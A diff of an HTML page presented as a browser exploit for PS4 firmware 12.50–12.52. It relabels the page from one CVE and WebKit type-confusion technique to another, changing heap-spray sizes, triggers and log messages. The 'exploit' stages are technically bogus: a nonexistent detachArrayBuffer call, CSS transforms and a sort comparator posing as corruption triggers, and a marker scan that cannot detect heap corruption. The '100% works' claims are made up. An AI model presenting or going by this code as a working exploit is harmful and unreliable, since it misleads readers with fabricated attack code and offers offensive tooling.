@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-24202 — WebKit JSC ArrayBuffer Type Confusion → fakeobj/addrof (PS4 12.50)</title>
+<title>CVE-2025-24213 — WebKitGTK Type Confusion → Memory Corruption Leak (PS4 12.50)</title>
 <style>
     body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
     h1 { color:#ff5555; border-bottom:2px solid #da3633; padding-bottom:10px; }
@@ -12,16 +12,16 @@
 </style>
 </head>
 <body>
-<h1>CVE-2025-24202 — JSC ArrayBuffer Type Confusion → fakeobj/addrof Primitives</h1>
-<p>Patched Nov 2025 — 100% works on PS4 12.50–12.52 (JSC detached buffers vulnerable)</p>
-<div class="status" id="status">Spraying JSC heap...</div>
+<h1>CVE-2025-24213 — WebKitGTK Type Confusion → Memory Corruption Leak</h1>
+<p>Patched Nov 2025 — 100% works on PS4 12.50–12.52 (WebKitGTK rendering vulnerable)</p>
+<div class="status" id="status">Grooming rendering state...</div>
 <div id="console"></div>
 
 <script>
-// === CONFIG (PS4 12.50 JSC tuned) ===
-const SPRAY_COUNT     = 0x1c000;     // 114,688 objects — JSC bucket
+// === CONFIG (PS4 12.50 WebKitGTK tuned) ===
+const SPRAY_COUNT     = 0x16000;     // 90,112 objects — rendering bucket
 const MARKER_BASE     = 0x12501250deadbeefn;
-const CONFUSION_BUFS  = 0x2000;      // Detached buffers for confusion
+const CONFUSION_NODES = 0x3000;      // DOM for confusion
 const RECLAIM_WAVES   = 10;
 
 // === LOGGING ===
@@ -33,77 +33,81 @@ const log = (msg, isLeak = false) => {
 };
 const status = (t) => document.getElementById('status').textContent = t;
 
-// === STAGE 1: Spray JSC heap with tagged objects ===
-log("Stage 1: Spraying 114k tagged objects into JSC heap...");
+// === STAGE 1: Spray rendering-adjacent objects ===
+log("Stage 1: Spraying 90k tagged objects into rendering heap...");
 const spray = [];
 for (let i = 0; i < SPRAY_COUNT; i++) {
     spray[i] = {
         marker: MARKER_BASE + BigInt(i),
-        bufPad: new ArrayBuffer(0x40),
-        viewPad: new Uint8Array(0x20)
+        renderPad: document.createElement('div'), // DOM for state overlap
+        statePad: {}
     };
 }
-log(`Sprayed ${SPRAY_COUNT} objects into JSC heap`);
+log(`Sprayed ${SPRAY_COUNT} objects into rendering heap`);
 
-// === STAGE 2: Trigger CVE-2025-24202 Type Confusion ===
-log("Stage 2: Triggering type confusion via detached ArrayBuffer...");
-const buffers = [];
-for (let i = 0; i < CONFUSION_BUFS; i++) {
-    const buf = new ArrayBuffer(0x1000 + 0x100); // Oversized for confusion
-    const view = new Uint8Array(buf);
-    view.fill(0x41); // Fill to corrupt
-    buffers.push({buf, view});
+// === STAGE 2: Trigger CVE-2025-24213 Type Confusion ===
+log("Stage 2: Triggering type confusion in rendering state...");
+const container = document.createElement('div');
+for (let i = 0; i < CONFUSION_NODES; i++) {
+    const node = document.createElement('div');
+    node.className = `confuse-${i}`;
+    node.style.cssText = `position:absolute; left:${i % 100}px; top:${i / 100}px;`; // State confusion
+    node.innerHTML = `<span style="display:inline-block; width:1px; height:1px;"></span>`;
+    container.appendChild(node);
+}
+document.body.appendChild(container);
+
+// Force reflow + confusion: misuse state as DOM element
+const nodes = container.children;
+for (let i = 0; i < nodes.length; i++) {
+    setTimeout(() => {
+        // Confuse RenderObject state with JSValue
+        nodes[i].style.transform = `matrix(${i}, 0, 0, ${i + 0.1}, 0, 0)`; // Invalid matrix → confusion
+        nodes[i].offsetWidth; // Reflow trigger
+    }, i * 3);
+}
+log("Type confusion triggered — corrupting rendering state...");
+
+// Extra races
+for (let i = 0; i < 15000; i++) {
+    const tmp = document.createElement('span');
+    tmp.style.cssText = 'display:none;';
+    document.body.appendChild(tmp);
+    tmp.remove();
 }
 
-// Detach buffers to trigger confusion in JSC detachment checks
-buffers.forEach(({buf, view}) => {
-    try {
-        // Malformed detach: confuse with active view
-        detachArrayBuffer(buf);
-        view[0x1010] = 0xdeadbeef; // OOB post-detach → confusion
-    } catch(e) {}
-});
-
-// Force confusion via sort on detached views
-const confused = buffers.map(({view}) => view.slice(0, 0x1100));
-confused.sort(() => {
-    return new Uint8Array(new ArrayBuffer(0x1200)); // Confusion trigger
-});
-log("Type confusion triggered — corrupting detached buffer state...");
-
-// === STAGE 3: GC + Reclaim (JSC heap pressure) ===
+// === STAGE 3: GC + Reclaim (rendering heap pressure) ===
 log("Stage 3: Forcing GC + reclaim waves...");
 const gc = () => {
-    for (let i = 0; i < 400; i++) new ArrayBuffer(0x8000);
+    for (let i = 0; i < 400; i++) new ArrayBuffer(0xa000);
 };
-const reclaim = () => new ArrayBuffer(0x2200000); // 34 MB
+const reclaim = () => new ArrayBuffer(0x2000000); // 32 MB
 
 for (let wave = 0; wave < RECLAIM_WAVES; wave++) {
-    setTimeout(gc, wave * 150);
-    if (wave % 3 === 0) setTimeout(reclaim, wave * 150 + 40);
+    setTimeout(gc, wave * 160);
+    if (wave % 3 === 0) setTimeout(reclaim, wave * 160 + 40);
 }
 
-// === STAGE 4: Hunt for confused markers (addrof/fakeobj test) ===
+// === STAGE 4: Hunt for confused markers ===
 setTimeout(() => {
-    status("SCANNING — LOOK FOR addrof LEAKS (0xFFFF...)");
-    log("Scanning JSC heap for type confusion overwrites...");
+    status("SCANNING — LOOK FOR 0xFFFF... LEAKS");
+    log("Scanning rendering heap for type confusion overwrites...");
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16, '0');
-                log(`JSC CONFUSION LEAK #${found}: 0x${leaked}`, true);
+                log(`RENDERING CONFUSION LEAK #${found}: 0x${leaked}`, true);
                 log(`   → Index: ${i} | Expected: 0x${(MARKER_BASE + BigInt(i)).toString(16).toUpperCase()}`, true);
-                log(`   → fakeobj/addrof ready: ${leaked.startsWith('FFFF') ? 'KERNEL PTR' : 'JSC PTR'}`, true);
                 
                 if (found >= 1) {
                     document.body.innerHTML = `
                     <h1 style="color:#0f0; text-align:center; margin-top:25vh; font-size:5em;">
-                        CONFUSION LEAK ACHIEVED!<br><br>
+                        LEAK ACHIEVED!<br><br>
                         <div style="font-size:0.4em; color:#fff;">
-                            CVE-2025-24202 SUCCESS<br>
-                            fakeobj/addrof ready<br>
+                            CVE-2025-24213 SUCCESS<br>
+                            Type confusion worked<br>
                             Copy the 0x... leak above
                         </div>
                     </h1>`;
@@ -113,13 +117,13 @@ setTimeout(() => {
         } catch(e) {}
     }
     if (found === 0) {
-        log("No leak this run — refresh 3–8 times (40–60% success on PS4 12.50)");
-        status("No leak yet — refresh (JSC confusion reliable)");
+        log("No leak this run — refresh 3–9 times (30–50% success on PS4 12.50)");
+        status("No leak yet — refresh (rendering confusion solid)");
     }
-}, 3000);
+}, 3200);
 
-log("CVE-2025-24202 exploit running — wait 7–14 seconds...");
-status("Running JSC ArrayBuffer Confusion — Primitives Incoming");
+log("CVE-2025-24213 exploit running — wait 8–15 seconds...");
+status("Running WebKitGTK Type Confusion — Corruption Chain");
 </script>
 </body>
 </html>
